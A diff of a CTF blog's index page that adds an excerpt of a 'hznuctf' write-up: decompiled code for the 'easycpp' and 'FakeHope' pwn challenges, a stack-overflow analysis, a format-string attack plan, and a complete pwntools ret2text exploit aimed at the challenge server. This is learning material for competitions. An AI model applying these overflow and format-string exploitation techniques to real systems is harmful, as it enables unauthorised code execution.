@@ -126,6 +126,171 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2024/04/28/hznuctf/" >hznuctf</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-04-28  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="easycpp"><a href="#easycpp" class="headerlink" title="easycpp"></a>easycpp</h2><p>std::ios_base::width 这段代码设置了输入长度为96，buf距离rbp的距离为 0x90，不过 strcmp(s1, s2); 这里cmp成功的话走到后边cpy就会有一个溢出，程序存在一个backdoor函数，ret2text</p>
+<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int __cdecl main(int argc, const char **argv, const char **envp)
+&#123;
+  __int64 v3; &#x2F;&#x2F; rax
+  __int64 v4; &#x2F;&#x2F; rax
+  __int64 v5; &#x2F;&#x2F; rax
+  __int64 v6; &#x2F;&#x2F; rax
+  __int64 v7; &#x2F;&#x2F; rax
+  __int64 v8; &#x2F;&#x2F; rax
+  __int64 v9; &#x2F;&#x2F; rax
+  __int64 v10; &#x2F;&#x2F; rax
+  __int64 v11; &#x2F;&#x2F; rax
+  __int64 v12; &#x2F;&#x2F; rax
+  __int64 v13; &#x2F;&#x2F; rax
+  __int64 v14; &#x2F;&#x2F; rax
+  __int64 v15; &#x2F;&#x2F; rax
+  __int64 v16; &#x2F;&#x2F; rax
+  __int64 v17; &#x2F;&#x2F; rax
+  char s2[96]; &#x2F;&#x2F; [rsp+0h] [rbp-90h] BYREF
+  char s1[44]; &#x2F;&#x2F; [rsp+60h] [rbp-30h] BYREF
+  unsigned int v21; &#x2F;&#x2F; [rsp+8Ch] [rbp-4h]
+
+  init();
+  v3 &#x3D; std::operator&lt;&lt;&lt;char&gt;(&amp;std::cout, &amp;str02[abi:cxx11]);
+  std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
+  v4 &#x3D; std::operator&lt;&lt;&lt;char&gt;(&amp;std::cout, &amp;str03[abi:cxx11]);
+  std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
+  v5 &#x3D; std::operator&lt;&lt;&lt;char&gt;(&amp;std::cout, &amp;str04[abi:cxx11]);
+  std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
+  v6 &#x3D; std::operator&lt;&lt;&lt;char&gt;(&amp;std::cout, &amp;str05[abi:cxx11]);
+  std::ostream::operator&lt;&lt;(v6, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
+  v7 &#x3D; std::operator&lt;&lt;&lt;char&gt;(&amp;std::cout, &amp;str06[abi:cxx11]);
+  std::ostream::operator&lt;&lt;(v7, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
+  v8 &#x3D; std::operator&lt;&lt;&lt;char&gt;(&amp;std::cout, &amp;str07[abi:cxx11]);
+  std::ostream::operator&lt;&lt;(v8, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
+  v9 &#x3D; std::operator&lt;&lt;&lt;char&gt;(&amp;std::cout, &amp;str08[abi:cxx11]);
+  std::ostream::operator&lt;&lt;(v9, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
+  v10 &#x3D; std::operator&lt;&lt;&lt;char&gt;(&amp;std::cout, &amp;str09[abi:cxx11]);
+  std::ostream::operator&lt;&lt;(v10, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
+  v11 &#x3D; std::operator&lt;&lt;&lt;char&gt;(&amp;std::cout, &amp;str10[abi:cxx11]);
+  std::ostream::operator&lt;&lt;(v11, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
+  v12 &#x3D; std::operator&lt;&lt;&lt;char&gt;(&amp;std::cout, &amp;str11[abi:cxx11]);
+  std::ostream::operator&lt;&lt;(v12, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
+  v13 &#x3D; std::operator&lt;&lt;&lt;char&gt;(&amp;std::cout, &amp;str12[abi:cxx11]);
+  v14 &#x3D; std::ostream::operator&lt;&lt;(v13, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
+  std::ostream::operator&lt;&lt;(v14, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
+  v15 &#x3D; std::operator&lt;&lt;&lt;char&gt;(&amp;std::cout, &amp;str01[abi:cxx11]);
+  std::ostream::operator&lt;&lt;(v15, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
+  v16 &#x3D; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Tell me,which ctf is the best CTF?&quot;);
+  std::ostream::operator&lt;&lt;(v16, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
+  std::ios_base::width((std::ios_base *)&amp;unk_404250, 96LL);
+  std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cin, s2);
+  v17 &#x3D; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, s2);
+  std::ostream::operator&lt;&lt;(v17, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
+  strcpy(s1, &quot;HZNUCTF,bestCTF!&quot;);
+  v21 &#x3D; strcmp(s1, s2);
+  std::ostream::operator&lt;&lt;(&amp;std::cout, v21);
+  if ( v21 )
+  &#123;
+    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Well, maybe you can try to believe HZNUCTF.&quot;);
+  &#125;
+  else
+  &#123;
+    memcpy(s1, s2, 0x60uLL);
+    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;You are right!&quot;);
+    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, s1);
+  &#125;
+  return 0;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>exp:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token comment"># from LibcSearcher import *</span>
+<span class="token keyword">import</span> itertools
+<span class="token keyword">import</span> ctypes
+
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+is_debug <span class="token operator">=</span> <span class="token number">0</span>
+IP <span class="token operator">=</span> <span class="token string">"150.158.117.224"</span>
+PORT <span class="token operator">=</span> <span class="token number">20023</span>
+
+elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./easycpp'</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
+
+<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
+sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
+r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+backdoor <span class="token operator">=</span> <span class="token number">0x4012FE</span>
+
+payload <span class="token operator">=</span> <span class="token string">b'HZNUCTF,bestCTF!'</span>
+payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">10</span>
+<span class="token comment"># g(p)</span>
+sla<span class="token punctuation">(</span><span class="token string">"Tell me,which ctf is the best CTF?"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="FakeHope"><a href="#FakeHope" class="headerlink" title="FakeHope"></a>FakeHope</h2><p>保护全开，同时输入函数是 scanf %s 存在 00截断，可以找一个指向栈的双重指针，通过这个双重指针往栈上写一个地址，这样就实现任意地址读写了，通过双重指针去调整这个地址，就能实现写 四个字节 八个字节的长数据，发现是低版本的libc，csu会被编译到elf里面，本来想着在buf附近用格式化字符串写rop 用csu去调整rsp的位置，但是buf那边有几个操作会修改buf里的数据，不太好布置，然后就往返回地址那写rop, 因为程序不能正常返回，不过只需要劫持子函数的返回地址为leave ret 就能正常返回了</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">hope</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">unsigned</span> __int64 <span class="token function">hope</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">char</span> format<span class="token punctuation">[</span><span class="token number">264</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-110h] BYREF</span>
+  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+108h] [rbp-8h]</span>
+
+  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">do</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2004<span class="token punctuation">,</span> format<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>format<span class="token punctuation">,</span> <span class="token string">"exit"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo FakeHope"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>exp写的很烂,不过懒得改了(</p>
+<p>exp:</p>
+	
+	</div>
+  <a type="button" href="/2024/04/28/hznuctf/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2024/04/24/geekcon/" >geekcon</a>
 		</h3>
 		</div>
@@ -240,50 +405,6 @@
 	
 	</div>
   <a type="button" href="/2024/04/24/geekcon/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/03/31/尝试编译kernel和文件系统/" >尝试编译kernel和文件系统</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-03-31  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p>learn about kernel pwn</p>
-<h1 id="尝试编译kernel和文件系统，使用qemu启动"><a href="#尝试编译kernel和文件系统，使用qemu启动" class="headerlink" title="尝试编译kernel和文件系统，使用qemu启动"></a>尝试编译kernel和文件系统，使用qemu启动</h1><h2 id="step1-make-filesystem-compile-busybox"><a href="#step1-make-filesystem-compile-busybox" class="headerlink" title="step1:make filesystem (compile busybox)"></a>step1:make filesystem (compile busybox)</h2><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/qemu-emulate/#_3">https://ctf-wiki.org/pwn/linux/kernel-mode/environment/qemu-emulate/#_3</a></p>
-<p>下载busybox编译</p>
-<pre class="line-numbers language-none"><code class="language-none">wget https:&#x2F;&#x2F;busybox.net&#x2F;downloads&#x2F;busybox-1.32.1.tar.bz2
-tar -jxf busybox-1.32.1.tar.bz2
-
-make menuconfig &#x2F;&#x2F; 在Setting中把build static binay勾选 静态链接
-make -j4
-make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>在make install后可以看到busybox文件夹中多出来一个_install 文件夹， _install文件夹中有</p>
-<pre class="line-numbers language-none"><code class="language-none">lhj@lhj-virtual-machine:~&#x2F;Desktop&#x2F;nydn_kernel_learn&#x2F;busybox-1.32.1&#x2F;_install$ ls
-bin  linuxrc  sbin  usr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>创建必要的文件夹</p>
-<pre class="line-numbers language-none"><code class="language-none">lhj@lhj-virtual-machine:~&#x2F;Desktop&#x2F;nydn_kernel_learn&#x2F;busybox-1.32.1&#x2F;_install$ mkdir -p  proc sys dev etc&#x2F;init.d
-lhj@lhj-virtual-machine:~&#x2F;Desktop&#x2F;nydn_kernel_learn&#x2F;busybox-1.32.1&#x2F;_install$ ls
-bin  dev  etc  linuxrc  proc  sbin  sys  usr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2024/03/31/尝试编译kernel和文件系统/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -1459,13 +1580,9 @@ LABEL_12<span class="token operator">:</span>
 		<h4>Categories</h4>
 		<ul class="tag_box inline list-unstyled">
 		
-			<li><a href="/categories/ctf/">ctf<span>54</span></a></li>
-		
-			<li><a href="/categories/fmt/">fmt<span>1</span></a></li>
+			<li><a href="/categories/ctf/">ctf<span>56</span></a></li>
 		
 			<li><a href="/categories/gdb/">gdb<span>1</span></a></li>
-		
-			<li><a href="/categories/kernel/">kernel<span>1</span></a></li>
 		
 			<li><a href="/categories/misc/">misc<span>1</span></a></li>
 		
@@ -1482,20 +1599,48 @@ LABEL_12<span class="token operator">:</span>
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/misc/">misc<span>1</span></a></li>
+			<li><a href="/tags/php-pwn/">php pwn<span>1</span></a></li>
 		
-			<li><a href="/tags/ctf-writeup/">ctf writeup<span>54</span></a></li>
-		
-			<li><a href="/tags/rust/">rust<span>1</span></a></li>
+			<li><a href="/tags/go-pwn/">go pwn<span>1</span></a></li>
 		
 			<li><a href="/tags/oslab/">oslab<span>1</span></a></li>
 		
+			<li><a href="/tags/xv6/">xv6<span>1</span></a></li>
+		
+			<li><a href="/tags/ptmalloc2/">ptmalloc2<span>8</span></a></li>
+		
 			<li><a href="/tags/kernel/">kernel<span>1</span></a></li>
 		
-			<li><a href="/tags/gdb/">gdb<span>1</span></a></li>
+			<li><a href="/tags/chroot-escape/">chroot escape<span>1</span></a></li>
 		
-			<li><a href="/tags/fmt/">fmt<span>1</span></a></li>
+			<li><a href="/tags/ctf-writeup/">ctf writeup<span>56</span></a></li>
 		
+			<li><a href="/tags/vm-pwn/">vm pwn<span>2</span></a></li>
+		
+			<li><a href="/tags/riscv-pwn/">riscv pwn<span>1</span></a></li>
+		
+			<li><a href="/tags/shellcode/">shellcode<span>5</span></a></li>
+		
+			<li><a href="/tags/heap/">heap<span>13</span></a></li>
+		
+			<li><a href="/tags/iot/">iot<span>1</span></a></li>
+		
+			<li><a href="/tags/gdb/">gdb<span>2</span></a></li>
+		
+			<li><a href="/tags/win-pwn/">win pwn<span>1</span></a></li>
+		
+			<li><a href="/tags/seccomp/">seccomp<span>3</span></a></li>
+		
+			<li><a href="/tags/rust/">rust<span>1</span></a></li>
+		
+			<li><a href="/tags/grpc/">grpc<span>1</span></a></li>
+		
+			<li><a href="/tags/misc/">misc<span>1</span></a></li>
+		
+			<li><a href="/tags/cpp-pwn/">cpp pwn<span>3</span></a></li>
+		
+		
+		   <li><a href="/tags">...<span>26</span></a></li>
 		 
 		</ul>
 	</div>
@@ -1506,6 +1651,10 @@ LABEL_12<span class="token operator">:</span>
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2025/06/18/SmileyCTF/" ><i class="fa fa-file-o"></i>SmileyCTF</a>
+      </li>
     
       <li>
         <a href="/2025/05/03/rust入门-数据所有权与生命周期管理/" ><i class="fa fa-file-o"></i>rust入门_数据所有权与生命周期管理</a>
@@ -1521,10 +1670,6 @@ LABEL_12<span class="token operator">:</span>
     
       <li>
         <a href="/2025/01/27/x3ctf/" ><i class="fa fa-file-o"></i>x3ctf</a>
-      </li>
-    
-      <li>
-        <a href="/2025/01/27/KnightCTF/" ><i class="fa fa-file-o"></i>KnightCTF</a>
       </li>
     
   </ul>
